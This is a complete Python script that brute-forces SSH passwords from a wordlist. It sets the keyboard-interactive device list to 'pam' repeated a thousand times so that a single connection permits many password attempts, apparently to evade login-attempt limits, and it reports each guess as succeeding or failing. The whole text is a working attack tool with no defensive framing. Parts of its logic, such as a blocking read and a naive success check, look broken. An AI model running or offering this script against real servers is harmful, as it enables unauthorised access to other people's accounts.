#!/usr/bin/env python3

import sys
import subprocess

if len(sys.argv) != 4:
    print('Usage: ./brute_ssh_keyboard.py server user filename')
    sys.exit()

def get_ssh_connection(server, user):
    """
    Brute force the SSH server.

    Open a connection to the SSH server and configure it for 1000 keyboard
    interactive sessions.
    """
    cmd = ['ssh', '-l{0}'.format(user),
           '-oKbdInteractiveDevices={0}'.format('pam,' * 1000),
           server]
    ssh = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT)

    return ssh

server = sys.argv[1]
user = sys.argv[2]
word_file = sys.argv[3]
count = 1000
ssh = get_ssh_connection(server, user)

with open(word_file) as f:
    for line in f:
        word = line.strip('\r\n')
        input = '{0}\n'.format(word).encode('utf-8')

        ssh.stdin.write(input)
        output = ssh.stdout.read().decode('utf-8')
        print(output)
        
        if 'Password' in output:
            print('{0}:{1} - Failed'.format(user, word))
        else:
            print('{0}:{1} - Success'.format(user, word))

        count += 1
        if count % 1000 == 0:
            ssh.kill()
            ssh = get_ssh_connection(server, user)

